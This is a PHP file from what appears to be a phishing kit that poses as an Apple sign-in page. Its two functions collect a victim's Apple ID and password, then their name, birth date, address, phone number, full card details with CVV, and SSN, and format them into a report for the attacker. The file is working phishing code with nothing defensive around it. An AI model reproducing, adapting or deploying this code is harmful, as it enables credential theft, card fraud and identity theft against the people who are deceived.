<?php

function login(){

$Eamil =  $_POST['e'];
$_SESSION['Eamil'] = $Eamil;
$Password = $_POST['p'];
$_SESSION['Password'] = $Password;
$ip = getenv("REMOTE_ADDR");
$data = gmdate ("Y-n-d")." @ ".gmdate ("H:i:s");
$msg ="
[~]================== Apple Login ==================[~]<br />
|Apple ID = <b><font color='green'>$Eamil</font></b><br />
|Apple Password = <b><font color='green'>$Password</font></b><br />
|--------------------Parsonal Info-----------------<br />
|IP = $ip <br />
|Date = $data <br />
|Country = ".$_SESSION["COUNTRY"]."<br />
|browser =".$_SESSION["bro"]."<br />
[~]=================================================[~]
";
return $msg;
}
 function appleallinfo(){
$ip = getenv("REMOTE_ADDR");
$data = gmdate ("Y-n-d")." @ ".gmdate ("H:i:s");
$FN =  $_POST["FN"];
$LN =  $_POST["LN"];
$DOB =  $_POST["DOB"];
$Country =  $_POST["Country"];
$Add1 =  $_POST["add1"];
$Add2 =  $_POST["add2"];
$City =  $_POST["city"];
$stats =  $_POST["stats"];
$zip =  $_POST["zip"];
$mobile =  $_POST["mobile"];
$cardholder =  $_POST["cardholder"];
$cardnumber =  $_POST["cardnumber"];
$carddata =  $_POST["carddata"];
$cvv =  $_POST["cvv"];
$vbv =  $_POST["vbv"];
$ssn =  $_POST["SSn"];
$msg ="
[~]================== Apple Account ==================[~]<br />
|Apple ID = <b><font color='green'>".$_SESSION['Eamil']."</font></b><br />
|Apple Password = <b><font color='green'>".$_SESSION['Password']."</font></b><br />
|=====================================================<br />
|Frist Name = <b><font color='green'>$FN</font></b><br />
|Last Name = <b><font color='green'>$LN</font></b><br />
|Data Of berithday = <b><font color='green'>$DOB</font></b><br />
|Country = <b><font color='green'>$Country</font></b><br />
|Address 1 = <b><font color='green'>$Add1</font></b><br />
|Address 2 = <b><font color='green'>$Add2</font></b><br />
|City = <b><font color='green'>$City</font></b><br />
|ssn/sort code = <b><font color='green'>$stats</font></b><br />
|Zip Code = <b><font color='green'>$zip</font></b><br />
|Mobile = <b><font color='green'>$mobile</font></b><br />
|=====================================================<br />
|Card Name = <b><font color='green'>$cardholder</font></b><br />
|Card Number = <b><font color='green'>$cardnumber</font></b><br />
|Date Card = <b><font color='green'>$carddata</font></b><br />
|CVV = <b><font color='green'>$cvv</font></b><br />
|ACC = <b><font color='green'>$vbv</font></b><br />
|SNN = <b><font color='green'>$ssn</font></b><br />
|--------------------Parsonal Info-----------------<br />
|IP = $ip <br />
|Date = $data <br />
|Country = ".$_SESSION["COUNTRY"]."<br />
|browser =".$_SESSION["bro"]."<br />
[~]===================================================[~]
";
return $msg;
 }

?>
